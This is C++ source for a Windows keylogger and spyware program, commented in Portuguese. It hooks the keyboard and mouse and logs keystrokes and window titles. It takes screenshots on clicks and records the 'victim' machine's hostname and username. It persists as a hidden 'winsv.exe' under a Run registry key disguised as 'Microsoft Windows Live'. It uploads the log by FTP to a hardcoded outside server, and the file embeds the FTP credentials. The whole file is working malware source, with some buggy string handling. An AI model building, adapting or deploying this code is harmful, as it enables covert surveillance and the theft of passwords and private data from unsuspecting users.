#include <windows.h>
#include <stdio.h>
#include <fstream>
#include <iostream>
#include <string.h>
#include <wininet.h>
#include <wingdi.h>
 
#pragma comment(lib,"ws2_32.lib")
 
#define visible // (visible / invisible)
#define FILELOG "svc.html"
 
#define FTP_USER "COLIBRAX"
#define FTP_PASS "LESSUMOGAI@@1"
#define FTP_SERVER "files.000webhost.com"
 
#define DATA_SIZE 1024*1024*100 //100MB
#define MAXLINE 409600
#define MAX_LENGTH 1024
 
using namespace std;
 
//Global Keyboard Hook variable
HHOOK keyboardHook;
//Global Mouse Hook variable
HHOOK mouseHook;
//Global info computer
struct computer {
     
  TCHAR username[MAX_LENGTH+1];
  TCHAR hostname[MAX_LENGTH+1];
} ;
 
char lastwindow[256];
  
void getcomputerinfo(computer * victim);
void FileSubmit(char *,char *);
void WriteData(string Text);
LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);
void FileSubmit(char *localfile,char *remotefile);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseProc (int nCode, WPARAM wParam, LPARAM lParam);
void copyto(char *de,char *para,int init);
//screemshot
void TakeScreenShot(char * filename);
//save bmp to file
BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName);
 
 
 
// WinMain, a função main em janelas
int WINAPI WinMain (HINSTANCE hThisInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpszArgument,
    int nFunsterStil){
     
     
     
    HWND hwnd;      // O objeto para indicar a janela
    MSG messages;   // Objeto mensagem do Windows para controlar o acionamento de botões
    WNDCLASSEX wincl;   // O objeto para criar a janela
     
    computer * victim;
    victim = new computer();
 
    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = "whs"; // Nome da classe da janela
    wincl.lpfnWndProc = WindowProcedure;
    wincl.style = CS_DBLCLKS;
    wincl.cbSize = sizeof (WNDCLASSEX);
    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);      // Janela com icone default do Windows
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);          //Cursor default
    wincl.lpszMenuName = NULL;
    wincl.cbClsExtra = 0;
    wincl.cbWndExtra = 0;
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;       // Cor cinza de background
     
    if (!RegisterClassEx (&wincl))  // Se o registro da classe foi mal-sucedido return 0
        return 0;
     
    hwnd = CreateWindowEx (               // Criação da janela
        0,
        "whs",                 // Indicação da classe da janela
        "WHS - MONITOR",                 // Nome da janela
        WS_TILEDWINDOW ,           // Estilo da janela
        10,                               // x em relação ao desktop
        10,                                 // y em relação ao desktop
        800,                                  // largura da janela
        600,                               // altura da janela
        HWND_DESKTOP,
        NULL,
        hThisInstance,
        NULL
    );
     
    //pegar informações sobre a maquina
    getcomputerinfo(victim);
     
     
    //auto copia inicia
    char system[MAX_PATH];
    char windows[MAX_PATH];
    char pathtofile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
    GetSystemDirectory(system,sizeof(system));
    GetWindowsDirectory(windows,sizeof(windows));
     
    strcat(system,"\\winsv.exe");
    strcat(windows,"\\winsv.exe");
    copyto(pathtofile,system,true);
    copyto(pathtofile,windows,false);
    #ifdef visible
                   // Mostrar a janela
            ShowWindow (hwnd, nFunsterStil); 
    #endif
     
    //envia o log
    FileSubmit((char * )FILELOG,victim->username);
 
 
    //Initialise the keyboard Hook
    keyboardHook  = SetWindowsHookEx( WH_KEYBOARD_LL,  KeyboardProc, GetModuleHandle(NULL), 0 );
    mouseHook     = SetWindowsHookEx( WH_MOUSE_LL   ,  MouseProc   , GetModuleHandle(NULL), 0 );
     
    while (GetMessage (&messages, NULL, 0, 0)) // Recuperar mensagens
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }
     
    UnhookWindowsHookEx(keyboardHook);
    UnhookWindowsHookEx(mouseHook);
     
    return 0;
}
 
LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
    {
    switch (message)
    {
        case WM_CREATE: // Criação da janela
            CreateWindow(TEXT("STATIC"), TEXT("texto"), WS_CHILD |WS_HSCROLL| WS_VISIBLE | WS_BORDER, 1, 1, 800, 600, hwnd, NULL, NULL, NULL);
        break;
        case WM_COMMAND:   // Interpretação da janela
        break;
        case WM_DESTROY:   // Destruição da janela
            PostQuitMessage (0);
        break;
        default:
            return DefWindowProc (hwnd, message, wParam, lParam);
    }
    return 0;
}
 
void FileSubmit(char *localfile,char *remotefile)
{
    HINTERNET hInternet;
    HINTERNET hFtpSession;
    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        cout << "Error: " << GetLastError();
         
    }
    else
    {
        hFtpSession = InternetConnect(hInternet,FTP_SERVER, INTERNET_DEFAULT_FTP_PORT, FTP_USER, FTP_PASS, INTERNET_SERVICE_FTP, 0, 0);
        if (hFtpSession == NULL)
        {
            cout << "Error ftp: " << GetLastError();
        }
        else
        {
 
            if(FtpPutFile(hFtpSession, localfile, remotefile, FTP_TRANSFER_TYPE_BINARY, 0));
             
        }
    }
}
 
void TakeScreenShot(char * filename) {
  int x1, y1, x2, y2, w, h;
 
    // get screen dimensions
    x1  = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1  = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2  = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    w   = x2 - x1;
    h   = y2 - y1;
 
    // copy screen to bitmap
    HDC     hScreen = GetDC(NULL);
    HDC     hDC     = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
    BOOL    bRet    = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
     
    SaveHBITMAPToFile(hBitmap,filename);
    //CLEAN
    SelectObject(hDC, old_obj);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    DeleteObject(hBitmap);
};
  
BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName)
{
    string base64;
    HDC hDC;
    int iBits;
    WORD wBitCount;
    DWORD dwPaletteSize = 0, dwBmBitsSize = 0, dwDIBSize = 0, dwWritten = 0;
    BITMAP Bitmap0;
    BITMAPFILEHEADER bmfHdr;
    BITMAPINFOHEADER bi;
    LPBITMAPINFOHEADER lpbi;
    HANDLE fh, hDib, hPal, hOldPal2 = NULL;
    hDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
    iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
    DeleteDC(hDC);
    if (iBits <= 1)
        wBitCount = 1;
    else if (iBits <= 4)
        wBitCount = 4;
    else if (iBits <= 8)
        wBitCount = 8;
    else
        wBitCount = 24;
    GetObject(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = Bitmap0.bmWidth;
    bi.biHeight = -Bitmap0.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = wBitCount;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrImportant = 0;
    bi.biClrUsed = 256;
    dwBmBitsSize = ((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8
        * Bitmap0.bmHeight;
    hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
    lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
    *lpbi = bi;
 
    hPal = GetStockObject(DEFAULT_PALETTE);
    if (hPal)
    {
        hDC = GetDC(NULL);
        hOldPal2 = SelectPalette(hDC, (HPALETTE)hPal, FALSE);
        RealizePalette(hDC);
    }
 
 
    GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER)
        + dwPaletteSize, (BITMAPINFO *)lpbi, DIB_RGB_COLORS);
 
    if (hOldPal2)
    {
        SelectPalette(hDC, (HPALETTE)hOldPal2, TRUE);
        RealizePalette(hDC);
        ReleaseDC(NULL, hDC);
    }
 
/*  fh = CreateFile(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
 
    if (fh == INVALID_HANDLE_VALUE)
        return FALSE;
*/
    bmfHdr.bfType = 0x4D42; // "BM"
    dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
    bmfHdr.bfSize = dwDIBSize;
    bmfHdr.bfReserved1 = 0;
    bmfHdr.bfReserved2 = 0;
    bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
/*  
    base64.append("<img src=\"data:image/jpeg;base64,");
    base64.append((LPSTR)&bmfHdr);
    base64.append((LPSTR)&lpbi);
    cout<< base64;
*/
/*  WriteFile(fh, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
 
    WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);
*/
    GlobalUnlock(hDib);
    GlobalFree(hDib);
    CloseHandle(fh);
    return TRUE;
}
   
  void virarTela(){
     
    DEVMODE mode;
    ZeroMemory(&mode, sizeof(mode));
    mode.dmSize = sizeof(mode);
  
    if (EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &mode)){
        mode.dmDisplayOrientation = DMDO_180;
  
        if (ChangeDisplaySettings(&mode, 0) == DISP_CHANGE_SUCCESSFUL){
            Sleep(5000);
            //restore defaults
            mode.dmDisplayOrientation = DMDO_DEFAULT;
            ChangeDisplaySettings(&mode, 0);
        }
    }
  }
   
  void getcomputerinfo(computer * victim){
     
     
    DWORD size = MAX_LENGTH;
    GetComputerName(victim->hostname, &size);
    WriteData("hostname: ");
    WriteData(victim->hostname);
    WriteData("<br />");
     
    size = sizeof(victim->username) / sizeof(victim->username[0]);
    GetUserName(victim->username, &size);
    WriteData("username: ");
    WriteData(victim->username);
    WriteData("<br />");
     
}
 
 
void WriteData(string Text)
{
    ofstream LogFile;
    LogFile.open(FILELOG, fstream::app);
    LogFile << Text;
    LogFile.close();
}
 
 
bool SpecialCharacters(int vKey)
{
    //If Shift is pressed
    if (GetKeyState(VK_SHIFT) & 0x8000)
    {
         switch(vKey)
        {
            case 9:
                WriteData("<TAB>");
                break;
            case 8:
                WriteData("<BACKSPACE>");
                break;
            case 13:
                WriteData("\n<ENTER>");
                break;
            case 27:
                WriteData("<ESC>");
                break;
            case 46:
                WriteData("<DELETE>");
                break;
            case 48:
                WriteData(")");
                break;
            case 49:
                WriteData("!");
                break;
            case 50:
                WriteData("@");
                break;
            case 51:
                WriteData("#");
                break;
            case 52:
                WriteData("$");
                break;
            case 53:
                WriteData("%");
                break;
            case 54:
                WriteData("^");
                break;
            case 55:
                WriteData("&");
                break;
            case 56:
                WriteData("*");
                break;
            case 57:
                WriteData("(");
                break;
            case -64:
                WriteData("~");
                break;
            case -67:
                WriteData("_");
                break;
            case -69:
                WriteData("+");
                break;
            case -70:
                WriteData(":");
                break;
            case -34:
                WriteData("\"");
                break;
            case -68:
                WriteData("<");
                break;
            case -66:
                WriteData(">");
                break;
            case -65:
                WriteData("?");
                break;
            default:
                return false;
        }
        return true;
    }
    //If Shift is unpressed
    else
    {
        if (vKey > 47 && vKey < 58)
        {
            switch (vKey)
            {
                case 48:
                    WriteData("0");
                    break;
                case 49:
                    WriteData("1");
                    break;
                case 50:
                    WriteData("2");
                    break;
                case 51:
                    WriteData("3");
                    break;
                case 52:
                    WriteData("4");
                    break;
                case 53:
                    WriteData("5");
                    break;
                case 54:
                    WriteData("6");
                    break;
                case 55:
                    WriteData("7");
                    break;
                case 56:
                    WriteData("8");
                    break;
                case 57:
                    WriteData("9");
                    break;
 
            }
        }
        switch (vKey)
        {
            case 9:
                WriteData("<TAB>");
                break;
            case 8:
                WriteData("<BACKSPACE>");
                break;
            case 13:
                WriteData("\n<ENTER>");
                break;
            case 32:
                WriteData(" ");
                break;
            case -95:
                WriteData("<SHIFT>");
                break;
            case -96:
                WriteData("<SHIFT>");
                break;
            case -66:
                WriteData(".");
                break;
            case -68:
                WriteData(",");
                break;
            case -67:
                WriteData("-");
                break;
            case 27:
                WriteData("<ESC>");
                break;
            case -69:
                WriteData("=");
                break;
            case 38:
                WriteData("[Cima]");
                break;
            case 40:
                WriteData("[Baixo>]");
                break;
            case 37:
                WriteData("[Esquerda]");
                break;
            case 39:
                WriteData("[Direita]");
                break;
            case 46:
                WriteData("<DELETE>");
                break;
            case -70:
                WriteData(";");
                break;
            case -34:
                WriteData("'");
                break;
            default:
                return false;
        }
        return true;
    }
}
 
 
void Log(char Key)
{
    char log[255];  
    HWND foreground = GetForegroundWindow();
    if (foreground)
    {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);
         
        if(strcmp(window_title, lastwindow)!=0) {
            strcpy(lastwindow, window_title);
             
            sprintf(log,"%s<br/><a>",log);
            sprintf(log,"%s%s",log,lastwindow);
            sprintf(log,"%s</a>",log);
        }
    }
    //Check for special characters (Shift, Enter etc.)
     
    if (SpecialCharacters(Key) == false)
    {
        //If not special character check A-Z
        if (Key > 64 && Key < 91)
        {
            //If Shift  AND  Caps Lock = Lowercase
            if (GetKeyState(VK_SHIFT) & 0x8000 && (GetKeyState(VK_CAPITAL) & 0x0001)!=0)
            {
                Key += 32;
               sprintf(log,"%s%c",log,Key);
            }
            //If Shift OR Caps Lock = Uppercase
            else if (GetKeyState(VK_SHIFT) & 0x8000 || (GetKeyState(VK_CAPITAL) & 0x0001)!=0)
            {
                 
               sprintf(log,"%s%c",log,Key);
            }
            //No Shift or Caps Lock = Lowercase
            else
            {
                Key += 32;
                sprintf(log,"%s%c",log,Key);
            }
        } else {
            if(Key>95&&Key<106){//numerico numpad
                Key-=48;
                sprintf(log,"%s%c",log,Key);
             } else {
                switch(Key){
                    case 110:
                        sprintf(log,"%s,",log, Key );
                    break;
                    case -62:
                        sprintf(log,"%s.",log, Key );
                    break;
                    case 111:
                        sprintf(log,"%s/",log, Key );
                    break;
                    case 106:
                        sprintf(log,"%s*",log, Key );
                    break;
                    case 109:
                        sprintf(log,"%s-",log, Key );
                    break;
                    case 107:
                        sprintf(log,"%s+",log, Key );
                    break;
                    default:
                        printf(log,"%s  \nE-%d",log, Key );
                    break;
                 
                }   
            }
        }
         
    }
     WriteData(log);
     sprintf(log,"");
}
 
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
    if (wParam == WM_KEYDOWN && nCode == HC_ACTION )
    {
        //Pass keystroke character into Log function
        char Key = key->vkCode;
        Log(Key);
    }
    //Wait for next keystroke
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}
 
LRESULT CALLBACK MouseProc (int nCode, WPARAM wParam, LPARAM lParam)
{
    MOUSEHOOKSTRUCT * pMouseStruct = (MOUSEHOOKSTRUCT *)lParam;
    if (pMouseStruct != NULL){
        if(wParam == WM_LBUTTONDOWN)
        {
            TakeScreenShot((char *)"test.bmp");
            //printf( "clicked" ); 
        }
        //printf("Mouse position X = %d  Mouse Position Y = %d\n", pMouseStruct->pt.x,pMouseStruct->pt.y);
    }
    return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}
 
void copyto(char *de,char *para,int init)
{
    CopyFile((LPCSTR)de,(LPCSTR)para,false);
    HKEY hKey;
   if(init){
        RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
        RegSetValueEx(hKey, "Microsoft Windows Live",0,REG_SZ,(const unsigned char*)para,sizeof(para));
        RegCloseKey(hKey);
    }
    SetFileAttributesA((LPCSTR)para,FILE_ATTRIBUTE_HIDDEN);
}
